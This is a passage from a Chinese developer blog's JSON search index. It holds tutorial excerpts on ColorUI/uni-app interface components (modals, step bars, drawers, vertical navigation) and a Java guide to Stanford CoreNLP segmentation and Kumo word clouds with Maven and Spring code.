@tap=\"hideModal\"\u003e \u003ctext class=\"cuIcon-close text-red\"\u003e\u003c/text\u003e \u003c/view\u003e \u003c/view\u003e \u003cview class=\"padding-xl\"\u003e Modal 内容。 \u003c/view\u003e \u003c/view\u003e \u003c/view\u003e 底部窗口 cu-modal结合bottom-modal实现底部弹窗 \u003cview class=\"cu-modal bottom-modal\" :class=\"modalName=='bottomModal'?'show':''\"\u003e \u003cview class=\"cu-dialog\"\u003e \u003cview class=\"cu-bar bg-white\"\u003e \u003cview class=\"action text-green\"\u003e确定\u003c/view\u003e \u003cview class=\"action text-blue\" @tap=\"hideModal\"\u003e取消\u003c/view\u003e \u003c/view\u003e \u003cview class=\"padding-xl\"\u003e Modal 内容。 \u003c/view\u003e \u003c/view\u003e \u003c/view\u003e 对话窗口 对话窗口相较于普通窗口底部多了一些用户交互的操作 //示例一 \u003cview class=\"cu-modal\" :class=\"modalName=='DialogModal1'?'show':''\"\u003e \u003cview class=\"cu-dialog\"\u003e \u003cview class=\"cu-bar bg-white justify-end\"\u003e \u003cview class=\"content\"\u003eModal标题\u003c/view\u003e \u003cview class=\"action\" @tap=\"hideModal\"\u003e \u003ctext class=\"cuIcon-close text-red\"\u003e\u003c/text\u003e \u003c/view\u003e \u003c/view\u003e \u003cview class=\"padding-xl\"\u003e Modal 内容。 \u003c/view\u003e \u003cview class=\"cu-bar bg-white justify-end\"\u003e \u003cview class=\"action\"\u003e \u003cbutton class=\"cu-btn line-green text-green\" @tap=\"hideModal\"\u003e取消\u003c/button\u003e \u003cbutton class=\"cu-btn bg-green margin-left\" @tap=\"hideModal\"\u003e确定\u003c/button\u003e \u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003c/view\u003e //示例二 \u003cview class=\"cu-modal\" :class=\"modalName=='DialogModal2'?'show':''\"\u003e \u003cview class=\"cu-dialog\"\u003e \u003cview class=\"cu-bar bg-white justify-end\"\u003e \u003cview class=\"content\"\u003eModal标题\u003c/view\u003e \u003cview class=\"action\" @tap=\"hideModal\"\u003e \u003ctext class=\"cuIcon-close text-red\"\u003e\u003c/text\u003e \u003c/view\u003e \u003c/view\u003e \u003cview class=\"padding-xl\"\u003e Modal 内容。 \u003c/view\u003e \u003cview class=\"cu-bar bg-white\"\u003e \u003cview class=\"action margin-0 fle","date":"2021-05-12","objectID":"/posts/colorui%E4%BA%A4%E4%BA%92%E7%BB%84%E4%BB%B6/:1:9","tags":["ColorUI"],"title":"ColorUI交互组件","uri":"/posts/colorui%E4%BA%A4%E4%BA%92%E7%BB%84%E4%BB%B6/"},{"categories":["前端"],"content":"Steps步骤条 cu-steps步骤条必选值 默认 cu-steps和cu-item配合使用 \u003cview class=\"bg-white padding\"\u003e \u003cview class=\"cu-steps\"\u003e \u003cview class=\"cu-item\" :class=\"index\u003ebasics?'':'text-red'\" v-for=\"(item,index) in basicsList\" :key=\"index\"\u003e \u003ctext :class=\"'cuIcon-' + item.cuIcon\"\u003e\u003c/text\u003e {{item.name}} \u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003cscript\u003e export default { data() { return { basicsList: [{cuIcon: 'usefullfill',name: '开始'}, {cuIcon: 'radioboxfill',name: '等待'}, {cuIcon: 'roundclosefill',name: '错误'}, {cuIcon: 'roundcheckfill',name: '完成' }], basics: 0 }; }, methods: { BasicsSteps() { this.basics= this.basics == this.basicsList.length - 1 ? 0 : this.basics + 1 } } } \u003c/script\u003e 步骤条的颜色和图标都可以自定义 \u003cview class=\"bg-white padding margin-top-xs\"\u003e \u003cview class=\"cu-steps\"\u003e \u003cview class=\"cu-item\" :class=\"index\u003ebasics?'':'text-orange'\" v-for=\"(item,index) in basicsList\" :key=\"index\"\u003e \u003ctext :class=\"index\u003ebasics?'cuIcon-title':'cuIcon-' + item.cuIcon\"\u003e\u003c/text\u003e {{item.name}} \u003c/view\u003e \u003c/view\u003e \u003c/view\u003e 步骤之间的连接默认是横线，也可以通过类名steps-arrow换成箭头 \u003cview class=\"bg-white padding margin-top-xs\"\u003e \u003cview class=\"cu-steps steps-arrow\"\u003e \u003cview class=\"cu-item\" :class=\"index\u003ebasics?'':'text-blue'\" v-for=\"(item,index) in basicsList\" :key=\"index\"\u003e \u003ctext :class=\"'cuIcon-' + item.cuIcon\"\u003e\u003c/text\u003e {{item.name}} \u003c/view\u003e \u003c/view\u003e \u003c/view\u003e 数字完成 通过类名num可以设置默认图标为数字，已完成且正确的图标为勾，已完成但错误的图标由类名err定义 \u003cview class=\"bg-white padding\"\u003e \u003cview class=\"cu-steps\"\u003e \u003cview class=\"cu-item\" :class=\"index\u003enum?'':'text-blue'\" v-for=\"(item,index) in numList\" :key=\"index\"\u003e \u003ctext class=\"num\" :class=\"index==2?'err':''\" :data-index=\"index + 1\"\u003e\u003c/text\u003e {{item.name}} \u003c/view\u003e \u003c/view\u003e \u003c/view\u003e 多级显示 多级显示需要配合scroll-view标签使用 ，并增加类名steps-bottom \u003cscroll-view scroll-x class=\"bg-white padding response cu-steps steps-bottom\" :scroll-into-view=\"'scroll-' + scroll\" scroll-with-animation\u003e \u003cview class=\"cu-item padding-lr-xl\" :class=\"index\u003escroll?'':'text-blue'\" v-for=\"(item,index) in 10\" :key=\"index\" :id=\"'scroll-' + index\"\u003e Level {{index + 1}} \u003ctext class=\"num\" :data-index=\"index + 1\"\u003e\u003c/text\u003e \u003c/view\u003e \u003c/scrol","date":"2021-05-12","objectID":"/posts/colorui%E4%BA%A4%E4%BA%92%E7%BB%84%E4%BB%B6/:1:10","tags":["ColorUI"],"title":"ColorUI交互组件","uri":"/posts/colorui%E4%BA%A4%E4%BA%92%E7%BB%84%E4%BB%B6/"},{"categories":["前端"],"content":"扩展插件 交互组件就到此为止了，不足之处请多多指教，便于我及时更正，承接上一篇基础元素的博客，扩展插件部分我们就在再另写一篇，ColorUI组件库简易教程之扩展插件 ","date":"2021-05-12","objectID":"/posts/colorui%E4%BA%A4%E4%BA%92%E7%BB%84%E4%BB%B6/:2:0","tags":["ColorUI"],"title":"ColorUI交互组件","uri":"/posts/colorui%E4%BA%A4%E4%BA%92%E7%BB%84%E4%BB%B6/"},{"categories":["前端"],"content":" 本文由 简悦 SimpRead 转码， 原文地址 blog.csdn.net 按照惯例，在此奉上官方示例！！！ 目录 [TOC] ","date":"2021-05-12","objectID":"/posts/colorui%E6%89%A9%E5%B1%95%E7%BB%84%E4%BB%B6/:0:0","tags":["ColorUI"],"title":"ColorUI扩展组件","uri":"/posts/colorui%E6%89%A9%E5%B1%95%E7%BB%84%E4%BB%B6/"},{"categories":["前端"],"content":"扩展插件 ","date":"2021-05-12","objectID":"/posts/colorui%E6%89%A9%E5%B1%95%E7%BB%84%E4%BB%B6/:1:0","tags":["ColorUI"],"title":"ColorUI扩展组件","uri":"/posts/colorui%E6%89%A9%E5%B1%95%E7%BB%84%E4%BB%B6/"},{"categories":["前端"],"content":"索引列表 索引列表主要由scroll-view标签实现，类名为indexes，具体js逻辑请看源码，有些我没看懂，希望看懂的大佬教教我 \u003ctemplate\u003e \u003cview\u003e \u003cview class=\"cu-bar bg-white search fixed\"\u003e \u003cview class=\"search-form round\"\u003e \u003ctext class=\"cuIcon-search\"\u003e\u003c/text\u003e \u003cinput type=\"text\" placeholder=\"输入搜索的关键词\" confirm-type=\"search\"\u003e\u003c/input\u003e \u003c/view\u003e \u003cview class=\"action\"\u003e \u003cbutton class=\"cu-btn bg-gradual-green shadow-blur round\"\u003e搜索\u003c/button\u003e \u003c/view\u003e \u003c/view\u003e \u003cscroll-view scroll-y class=\"indexes\" :scroll-into-view=\"'indexes-'+ listCurID\" :style=\"[{height:'calc(100vh - 50px)'}]\" :scroll-with-animation=\"true\" :enable-back-to-top=\"true\"\u003e \u003cblock v-for=\"(item,index) in list\" :key=\"index\"\u003e \u003c!-- 这个'indexItem-' + item.name类名，整个colorUI，我也没找到它的作用，删了也没发现什么影响--\u003e \u003cview :class=\"'indexItem-' + item.name\" :id=\"'indexes-' + item.name\" :data-index=\"item.name\"\u003e \u003cview class=\"padding\"\u003e{{item.name}}\u003c/view\u003e \u003cview class=\"cu-list menu-avatar no-padding\"\u003e \u003cview class=\"cu-item\" v-for=\"(items,sub) in 2\" :key=\"sub\"\u003e \u003cview class=\"cu-avatar round lg\"\u003e{{item.name}}\u003c/view\u003e \u003cview class=\"content\"\u003e \u003cview class=\"text-grey\"\u003e{{item.name}}\u003ctext class=\"text-abc\"\u003e{{list[sub].name}}\u003c/text\u003e君\u003c/view\u003e \u003cview class=\"text-gray text-sm\"\u003e 有{{sub+2}}个主子需要伺候 \u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003c/block\u003e \u003c/scroll-view\u003e \u003cview class=\"indexBar\" :style=\"[{height:'calc(100vh - 50px)'}]\"\u003e \u003cview class=\"indexBar-box\" @touchstart=\"tStart\" @touchend=\"tEnd\" @touchmove.stop=\"tMove\"\u003e \u003cview class=\"indexBar-item\" v-for=\"(item,index) in list\" :key=\"index\" :id=\"index\" @touchstart=\"getCur\" @touchend=\"setCur\"\u003e {{item.name}}\u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003c!--选择显示--\u003e \u003cview v-show=\"!hidden\" class=\"indexToast\"\u003e {{listCur}} \u003c/view\u003e \u003c/view\u003e \u003c/template\u003e \u003cscript\u003e export default { data() { return { StatusBar: this.StatusBar, CustomBar: this.CustomBar, hidden: true, listCurID: '', list: [], listCur: '', }; }, onLoad() { let list = [{}]; for (let i = 0; i \u003c 26; i++) { list[i] = {}; list[i].name = String.fromCharCode(65 + i); } this.list = list; this.listCur = list[0]; }, onReady() { let that = this; //这两句大概知道什么意思，但是emmm,这个boxTo","date":"2021-05-12","objectID":"/posts/colorui%E6%89%A9%E5%B1%95%E7%BB%84%E4%BB%B6/:1:1","tags":["ColorUI"],"title":"ColorUI扩展组件","uri":"/posts/colorui%E6%89%A9%E5%B1%95%E7%BB%84%E4%BB%B6/"},{"categories":["前端"],"content":"微动画 微动画我没办法截图展示出来这种动态效果，我就直接给出class了，想要看效果，可以去官方示例去看，这里有几个gif动画，我可以给个图和代码，看一下 \u003cview class=\"margin radius bg-gradual-green shadow-blur\"\u003e \u003c!-- 这个动图显示不出来，不知道是不是路径问题，还是源文件没了 --\u003e \u003cimage src=\"https://image.weilanwl.com/gif/wave.gif\" mode=\"scaleToFill\" class=\"gif-black response\" style=\"height:100upx\"\u003e\u003c/image\u003e \u003c/view\u003e \u003cview class=\"margin flex\"\u003e \u003cview class=\"bg-black flex-sub margin-right radius shadow-lg\"\u003e \u003cimage src=\"https://image.weilanwl.com/gif/loading-black.gif\" mode=\"aspectFit\" class=\"gif-black response\" style=\"height:240upx\"\u003e\u003c/image\u003e \u003c/view\u003e \u003cview class=\"bg-white flex-sub radius shadow-lg\"\u003e \u003cimage src=\"https://image.weilanwl.com/gif/loading-white.gif\" mode=\"aspectFit\" class=\"gif-white response\" style=\"height:240upx\"\u003e\u003c/image\u003e \u003c/view\u003e \u003c/view\u003e \u003cview class=\"margin flex\"\u003e \u003cview class=\"bg-gradual-blue flex-sub margin-right radius shadow-lg\"\u003e \u003cimage src=\"https://image.weilanwl.com/gif/rhomb-black.gif\" mode=\"aspectFit\" class=\"gif-black response\" style=\"height:240upx\"\u003e\u003c/image\u003e \u003c/view\u003e \u003cview class=\"bg-white flex-sub radius shadow-lg\"\u003e \u003cimage src=\"https://image.weilanwl.com/gif/rhomb-white.gif\" mode=\"aspectFit\" class=\"gif-white response\" style=\"height:240upx\"\u003e\u003c/image\u003e \u003c/view\u003e \u003c/view\u003e \u003cview class=\"margin flex\"\u003e \u003cview class=\"bg-white flex-sub margin-right radius shadow-lg\"\u003e \u003cimage src=\"https://image.weilanwl.com/gif/loading-1.gif\" mode=\"aspectFit\" class=\"gif-white response\" style=\"height:240upx\"\u003e\u003c/image\u003e \u003c/view\u003e \u003cview class=\"bg-black flex-sub radius shadow-lg\"\u003e \u003cimage src=\"https://image.weilanwl.com/gif/loading-2.gif\" mode=\"aspectFit\" class=\"gif-black response\" style=\"height:240upx\"\u003e\u003c/image\u003e \u003c/view\u003e \u003c/view\u003e 微动画相关class class说明可选值animation-{{options}}动画效果fade / scale-up / scale-down / slide-top / slide-bottom / slide-left / slide-right / shakeanimation-reverse反向动画，配合上面的动画效果使用  ","date":"2021-05-12","objectID":"/posts/colorui%E6%89%A9%E5%B1%95%E7%BB%84%E4%BB%B6/:1:2","tags":["ColorUI"],"title":"ColorUI扩展组件","uri":"/posts/colorui%E6%89%A9%E5%B1%95%E7%BB%84%E4%BB%B6/"},{"categories":["前端"],"content":"全屏抽屉 全屏抽屉效果主要分为三个部分，主要有三个类名，第一个类名DrawerPage，就是第一张图总体外部包裹的类名；第二个类名DrawerClose，用来包裹打开抽屉之后关闭部分，如图二红框框出来的部分；第三个类名DrawerWindow，就是打开的抽屉部分了 \u003ctemplate\u003e \u003cview class=\"bg-gradual-blue\"\u003e //全屏主体页面 \u003cscroll-view scroll-y class=\"DrawerPage\" :class=\"modalName=='viewModal'?'show':''\"\u003e \u003ccu-custom bgColor=\"bg-gradual-blue\" :isBack=\"true\"\u003e\u003cblock slot=\"backText\"\u003e返回\u003c/block\u003e \u003cblock slot=\"content\"\u003e全屏抽屉\u003c/block\u003e \u003c/cu-custom\u003e \u003cview class='padding margin text-center'\u003e \u003cview class='cu-btn bg-green lg block shadow radius margin-xl' @tap=\"showModal\" data-target=\"viewModal\"\u003e 打开抽屉 \u003c/view\u003e \u003c/view\u003e \u003cview class=\"cu-list menu card-menu margin-top-xl margin-bottom-xl shadow-lg\"\u003e \u003cview class=\"cu-item arrow\" v-for=\"(item,index) in 20\" :key=\"index\"\u003e \u003cview class=\"content\"\u003e \u003ctext class=\"cuIcon-github text-grey\"\u003e\u003c/text\u003e \u003ctext class=\"text-grey\"\u003e{{index +1}}\u003c/text\u003e \u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003cview class='padding margin text-center'\u003e \u003cview class='cu-btn bg-green lg block shadow radius margin-xl' @tap=\"showModal\" data-target=\"viewModal\"\u003e 打开抽屉 \u003c/view\u003e \u003c/view\u003e \u003c/scroll-view\u003e //关闭部分 \u003cview class=\"DrawerClose\" :class=\"modalName=='viewModal'?'show':''\" @tap=\"hideModal\"\u003e \u003ctext class=\"cuIcon-pullright\"\u003e\u003c/text\u003e \u003c/view\u003e //抽屉部分 \u003cscroll-view scroll-y class=\"DrawerWindow\" :class=\"modalName=='viewModal'?'show':''\"\u003e \u003cview class=\"cu-list menu card-menu margin-top-xl margin-bottom-xl shadow-lg\"\u003e \u003cview class=\"cu-item arrow\" v-for=\"(item,index) in 20\" :key=\"index\"\u003e \u003cview class=\"content\"\u003e \u003ctext class=\"cuIcon-github text-grey\"\u003e\u003c/text\u003e \u003ctext class=\"text-grey\"\u003e{{index +1}}\u003c/text\u003e \u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003c/scroll-view\u003e \u003c/view\u003e \u003c/template\u003e \u003cscript\u003e export default { data() { return { modalName:null }; }, methods: { showModal(e) { console.log(e) this.modalName = e.currentTarget.dataset.target }, hideModal(e) { this.modalName = null }, //这个函数没用到，我也不知道为什么源码作者写了 tabSelect(e) { this.TabCur = e.currentTarget.dataset.id; this.scrollLeft = (e.currentTarget.dataset.id - 1) * 60 } }, } \u003c/script\u003e \u003cstyle\u003e page { background-image: var(--gradualBlue); widt","date":"2021-05-12","objectID":"/posts/colorui%E6%89%A9%E5%B1%95%E7%BB%84%E4%BB%B6/:1:3","tags":["ColorUI"],"title":"ColorUI扩展组件","uri":"/posts/colorui%E6%89%A9%E5%B1%95%E7%BB%84%E4%BB%B6/"},{"categories":["前端"],"content":"垂直导航 垂直导航主要有两个scroll-view标签实现，分别是左侧的导航栏部分和右侧的内容部分，左侧导航栏部分使用类名VerticalBox，右侧内容部分使用类名VerticalMain \u003ctemplate\u003e \u003cview\u003e \u003cview class=\"fixed\"\u003e \u003ccu-custom :isBack=\"true\" bgColor=\"bg-shadeTop text-white\"\u003e \u003cblock slot=\"backText\"\u003e返回\u003c/block\u003e \u003cblock slot=\"content\"\u003e垂直导航\u003c/block\u003e \u003c/cu-custom\u003e \u003c/view\u003e \u003cswiper class=\"screen-swiper round-dot\" :indicator-dots=\"true\" :circular=\"true\" :autoplay=\"true\" interval=\"5000\" duration=\"500\"\u003e \u003cswiper-item v-for=\"(item,index) in 4\" :key=\"index\"\u003e \u003cimage :src=\"'https://ossweb-img.qq.com/images/lol/web201310/skin/big3900'+index+ '.jpg'\" mode=\"aspectFill\"\u003e\u003c/image\u003e \u003c/swiper-item\u003e \u003c/swiper\u003e \u003cview class=\"VerticalBox\"\u003e \u003cscroll-view class=\"VerticalNav nav\" scroll-y scroll-with-animation :scroll-top=\"verticalNavTop\" style=\"height:calc(100vh - 375upx)\"\u003e \u003cview class=\"cu-item\" :class=\"index==tabCur?'text-green cur':''\" v-for=\"(item,index) in list\" :key=\"index\" @tap=\"TabSelect\" :data-id=\"index\"\u003e Tab-{{item.name}} \u003c/view\u003e \u003c/scroll-view\u003e \u003cscroll-view class=\"VerticalMain\" scroll-y scroll-with-animation style=\"height:calc(100vh - 375upx)\" :scroll-into-view=\"'main-'+mainCur\" @scroll=\"VerticalMain\"\u003e \u003cview class=\"padding-top padding-lr\" v-for=\"(item,index) in list\" :key=\"index\" :id=\"'main-'+index\"\u003e \u003cview class=\"cu-bar solid-bottom bg-white\"\u003e \u003cview class=\"action\"\u003e \u003ctext class=\"cuIcon-title text-green\"\u003e\u003c/text\u003e Tab-{{item.name}}\u003c/view\u003e \u003c/view\u003e \u003cview class=\"cu-list menu-avatar\"\u003e \u003cview class=\"cu-item\"\u003e \u003cview class=\"cu-avatar round lg\" style=\"background-image:url(https://ossweb-img.qq.com/images/lol/web201310/skin/big10001.jpg);\"\u003e\u003c/view\u003e \u003cview class=\"content\"\u003e \u003cview class=\"text-grey\"\u003e凯尔\u003c/view\u003e \u003cview class=\"text-gray text-sm flex\"\u003e \u003ctext class=\"text-cut\"\u003e \u003ctext class=\"cuIcon-infofill text-red margin-right-xs\"\u003e\u003c/text\u003e 我已天理为凭，踏入这片荒芜，不再受凡人的枷锁遏制。我已天理为凭，踏入这片荒芜，不再受凡人的枷锁遏制。 \u003c/text\u003e \u003c/view\u003e \u003c/view\u003e \u003cview class=\"action\"\u003e \u003cview class=\"text-grey text-xs\"\u003e22:20\u003c/view\u003e \u003cview class=\"cu-tag round bg-grey sm\"\u003e5\u003c/view\u003e \u003c/view\u003e \u003c/view\u003e \u003cview class=\"cu-item\"\u003e \u003cview class=\"cu-avatar round lg\" sty","date":"2021-05-12","objectID":"/posts/colorui%E6%89%A9%E5%B1%95%E7%BB%84%E4%BB%B6/:1:4","tags":["ColorUI"],"title":"ColorUI扩展组件","uri":"/posts/colorui%E6%89%A9%E5%B1%95%E7%BB%84%E4%BB%B6/"},{"categories":["Java后端"],"content":"时光邮局---词云分析---Stanford Nlp","date":"2021-05-09","objectID":"/posts/stanford-corenlp-%E8%AF%8D%E4%BA%91/","tags":["NLP"],"title":"Stanford CoreNLP 词云","uri":"/posts/stanford-corenlp-%E8%AF%8D%E4%BA%91/"},{"categories":["Java后端"],"content":"Stanford Nlp是一个比较牛叉的自然语言处理工具，其很多模型都是基于深度学习方法进行训练得到的，准确率比起原来的很多工具有了很大程度的提高。近年来很多开源项目也用到了其中的一些方法。 最近重拾这个工具做点语义分析的工作，但是发现中文资料比较少，入门比较困难，所以整理一下自己的使用方法，希望对有需要的童鞋能够有点帮助。 本文主要是讲如何在Java工程中调用Stanford NLP的API。 ","date":"2021-05-09","objectID":"/posts/stanford-corenlp-%E8%AF%8D%E4%BA%91/:0:0","tags":["NLP"],"title":"Stanford CoreNLP 词云","uri":"/posts/stanford-corenlp-%E8%AF%8D%E4%BA%91/"},{"categories":["Java后端"],"content":"一、环境准备（导入依赖） ","date":"2021-05-09","objectID":"/posts/stanford-corenlp-%E8%AF%8D%E4%BA%91/:1:0","tags":["NLP"],"title":"Stanford CoreNLP 词云","uri":"/posts/stanford-corenlp-%E8%AF%8D%E4%BA%91/"},{"categories":["Java后端"],"content":"1、pom原始导入 \u003cproperties\u003e \u003ccorenlp.version\u003e4.0.0\u003c/corenlp.version\u003e \u003c/properties\u003e \u003cdependencies\u003e \u003cdependency\u003e \u003cgroupId\u003eedu.stanford.nlp\u003c/groupId\u003e \u003cartifactId\u003estanford-corenlp\u003c/artifactId\u003e \u003cversion\u003e${corenlp.version}\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eedu.stanford.nlp\u003c/groupId\u003e \u003cartifactId\u003estanford-corenlp\u003c/artifactId\u003e \u003cversion\u003e${corenlp.version}\u003c/version\u003e \u003cclassifier\u003emodels\u003c/classifier\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eedu.stanford.nlp\u003c/groupId\u003e \u003cartifactId\u003estanford-corenlp\u003c/artifactId\u003e \u003cversion\u003e${corenlp.version}\u003c/version\u003e \u003cclassifier\u003emodels-chinese\u003c/classifier\u003e \u003c/dependency\u003e \u003c/dependencies\u003e 如果上述方法pom不能导入可以选择第二种方法，把jar包下载到本地，然后本地导入 ","date":"2021-05-09","objectID":"/posts/stanford-corenlp-%E8%AF%8D%E4%BA%91/:1:1","tags":["NLP"],"title":"Stanford CoreNLP 词云","uri":"/posts/stanford-corenlp-%E8%AF%8D%E4%BA%91/"},{"categories":["Java后端"],"content":"2、本地导入 下载地址主要下载两个文件 在resources目录下新建lib包，将一下三个文件导入： pom文件导入本地Jar \u003cdependency\u003e \u003cgroupId\u003eedu.stanford.nlp\u003c/groupId\u003e \u003cartifactId\u003estanford-corenlp\u003c/artifactId\u003e \u003cversion\u003e4.2.1\u003c/version\u003e \u003cscope\u003esystem\u003c/scope\u003e \u003csystemPath\u003e${project.basedir}/src/main/resources/lib/stanford-corenlp-4.2.1.jar\u003c/systemPath\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eedu.stanford.nlp\u003c/groupId\u003e \u003cartifactId\u003estanford-corenlp\u003c/artifactId\u003e \u003cversion\u003e4.2.1\u003c/version\u003e \u003cclassifier\u003emodels-chinese\u003c/classifier\u003e \u003cscope\u003esystem\u003c/scope\u003e \u003csystemPath\u003e${project.basedir}/src/main/resources/lib/stanford-corenlp-4.2.1-models-chinese.jar\u003c/systemPath\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.ejml\u003c/groupId\u003e \u003cartifactId\u003eejml\u003c/artifactId\u003e \u003cversion\u003e0.39\u003c/version\u003e \u003c!-- \u003cclassifier\u003emodels\u003c/classifier\u003e--\u003e \u003cscope\u003esystem\u003c/scope\u003e \u003csystemPath\u003e${project.basedir}/src/main/resources/lib/ejml-core-0.39.jar\u003c/systemPath\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eedu.stanford.nlp\u003c/groupId\u003e \u003cartifactId\u003estanford-corenlp\u003c/artifactId\u003e \u003cversion\u003e4.2.1\u003c/version\u003e \u003cclassifier\u003emodels\u003c/classifier\u003e \u003cscope\u003esystem\u003c/scope\u003e \u003csystemPath\u003e${project.basedir}/src/main/resources/lib/stanford-corenlp-4.2.1-models.jar\u003c/systemPath\u003e \u003c/dependency\u003e ","date":"2021-05-09","objectID":"/posts/stanford-corenlp-%E8%AF%8D%E4%BA%91/:1:2","tags":["NLP"],"title":"Stanford CoreNLP 词云","uri":"/posts/stanford-corenlp-%E8%AF%8D%E4%BA%91/"},{"categories":["Java后端"],"content":"二、分词 package com.jd.posttimer.Util.SegmentationUtil; import edu.stanford.nlp.ling.CoreAnnotations; import edu.stanford.nlp.ling.CoreLabel; import edu.stanford.nlp.pipeline.Annotation; import edu.stanford.nlp.pipeline.StanfordCoreNLP; import edu.stanford.nlp.util.CoreMap; import edu.stanford.nlp.util.StringUtils; import java.util.ArrayList; import java.util.List; import java.util.Properties; /** * * Created by dd on 2017/6/8. * * 斯坦福NLP 包，中文分词和英文分词 * */ public class Segmentation { public List segInCh(String text) { //载入properties 文件 // StanfordCoreNLP pipline = new StanfordCoreNLP(\"StanfordCoreNLP-chinese.properties\"); //1.2 自定义功能 （1） // Properties properties = new Properties(); // properties.put(\"annotators\", \"tokenize, ssplit, pos, lemma, ner, parse, dcoref\"); // properties.setProperty(\"annotators\", \"tokenize, ssplit, pos, lemma, ner, parse, dcoref\"); // properties.setProperty(\"coref.algorithm\", \"neural\"); // properties.setProperty(\"add-modules \",\"java.se.ee\"); // properties.setProperty(\"ner.useSUTime\", \"false\"); // StanfordCoreNLP pipline = new StanfordCoreNLP(properties); // 自定义功能(2) 自己在项目中建一个properties 文件，然后在文件中设置模型属性，可以参考1中的配置文件 String[] args = new String[]{\"-props\", \"classpath:/properies/StanfordCoreNLP-chinese.properties\"}; Properties properties = StringUtils.argsToProperties(args); StanfordCoreNLP pipline = new StanfordCoreNLP(properties); //自定义功能(3) // StanfordCoreNLP pipline = new StanfordCoreNLP(PropertiesUtils.asProperties( // \"annotators\",\"tokenize,ssplit\", // \"ssplit.isOneSentence\", \"true\", // \"tokenize.language\", \"zh\", // \"segment.model\", \"edu/stanford/nlp/models/segmenter/chinese/ctb.gz\", // \"segment.sighanCorporaDict\", \"edu/stanford/nlp/models/segmenter/chinese\", // \"segment.serDictionary\", \"edu/stanford/nlp/models/segmenter/chinese/dict-chris6.ser.gz\", // \"segment.sighanPostProcessing\", \"true\" // )); //创建一个解析器，传入的是需要解析的文本 Annotation annotation = new Annotation(text); //解析 pipline.annotate(annotation); //根据标点符号，进行句子的切分，每一个句子被转化为一个CoreMap的数据结构，保存了句子的","date":"2021-05-09","objectID":"/posts/stanford-corenlp-%E8%AF%8D%E4%BA%91/:2:0","tags":["NLP"],"title":"Stanford CoreNLP 词云","uri":"/posts/stanford-corenlp-%E8%AF%8D%E4%BA%91/"},{"categories":["Java后端"],"content":"1、工具类调用service 工具类为了调用service方法： package com.jd.posttimer.Util; import lombok.extern.slf4j.Slf4j; import org.springframework.beans.BeansException; import org.springframework.beans.factory.DisposableBean; import org.springframework.context.ApplicationContext; import org.springframework.context.ApplicationContextAware; @Slf4j public class BeanUtil implements ApplicationContextAware, DisposableBean { private static ApplicationContext applicationContext = null; /** * 从静态变量applicationContext中取得Bean, 自动转型为所赋值对象的类型. */ public static \u003cT\u003e T getBean(Class\u003cT\u003e requiredType) { if(applicationContext==null){ throw new IllegalStateException(\"applicaitonContext属性未注入, 请在SpringBoot启动类中注册BeanUtil.\"); } return applicationContext.getBean(requiredType); } @Override public void destroy() { applicationContext = null; } @Override public void setApplicationContext(ApplicationContext applicationContext) throws BeansException { if (BeanUtil.applicationContext != null) { log.warn(\"BeanUtil中的ApplicationContext被覆盖, 原有ApplicationContext为:\" + BeanUtil.applicationContext); } BeanUtil.applicationContext = applicationContext; } } 主类注入 @Bean public BeanUtil beanUtil() { return new BeanUtil(); } 调用 private static LiuMessageService service; private static RedisUtils redisUtils; @Override public void run(){ service= BeanUtil.getBean(LiuMessageService.class); redisUtils=BeanUtil.getBean(RedisUtils.class); getWordCloud(); } ","date":"2021-05-09","objectID":"/posts/stanford-corenlp-%E8%AF%8D%E4%BA%91/:2:1","tags":["NLP"],"title":"Stanford CoreNLP 词云","uri":"/posts/stanford-corenlp-%E8%AF%8D%E4%BA%91/"},{"categories":["Java后端"],"content":"2、调用分词生成词云 词云依赖： \u003cdependency\u003e \u003cgroupId\u003ecom.kennycason\u003c/groupId\u003e \u003cartifactId\u003ekumo-core\u003c/artifactId\u003e \u003cversion\u003e1.13\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003ecom.kennycason\u003c/groupId\u003e \u003cartifactId\u003ekumo-tokenizers\u003c/artifactId\u003e \u003cversion\u003e1.12\u003c/version\u003e \u003c/dependency\u003e 生成词云，保存到redis,不等待结果，返回的是上一次的结果 @GetMapping(\"wordscloud\") public String getWordCloud() throws IOException { WordsCloud wordsCloud=new WordsCloud(); wordsCloud.start(); System.out.println(\"wordscloud\"); return redisUtils.get(\"words_cloud\"); } WordsCloud词云类 package com.jd.posttimer.Util.wordscloud; import com.jd.posttimer.Util.BeanUtil; import com.jd.posttimer.Util.Redis.RedisUtils; import com.jd.posttimer.Util.SegmentationUtil.Segmentation; import com.jd.posttimer.entity.LiuMessage; import com.jd.posttimer.service.PostEmailSer.LiuMessageService; import com.kennycason.kumo.CollisionMode; import com.kennycason.kumo.WordCloud; import com.kennycason.kumo.WordFrequency; import com.kennycason.kumo.bg.CircleBackground; import com.kennycason.kumo.font.KumoFont; import com.kennycason.kumo.font.scale.SqrtFontScalar; import com.kennycason.kumo.nlp.FrequencyAnalyzer; import com.kennycason.kumo.nlp.tokenizers.ChineseWordTokenizer; import com.kennycason.kumo.palette.LinearGradientColorPalette; import org.apache.tomcat.util.codec.binary.Base64; import java.awt.*; import java.io.ByteArrayOutputStream; import java.io.OutputStream; import java.util.ArrayList; import java.util.List; import java.util.Random; //@Component public class WordsCloud extends Thread{ // private LiuMessageService liuMessageService; private static LiuMessageService service; private static RedisUtils redisUtils; @Override public void run(){ service= BeanUtil.getBean(LiuMessageService.class); redisUtils=BeanUtil.getBean(RedisUtils.class); getWordCloud(); } public void getWordCloud(){ FrequencyAnalyzer frequencyAnalyzer = new FrequencyAnalyzer(); frequencyAnalyzer.setWordFrequenciesToReturn(600); frequencyAnalyzer.setMinWordLength(2); // 引入中文解析器 frequencyAna","date":"2021-05-09","objectID":"/posts/stanford-corenlp-%E8%AF%8D%E4%BA%91/:2:2","tags":["NLP"],"title":"Stanford CoreNLP 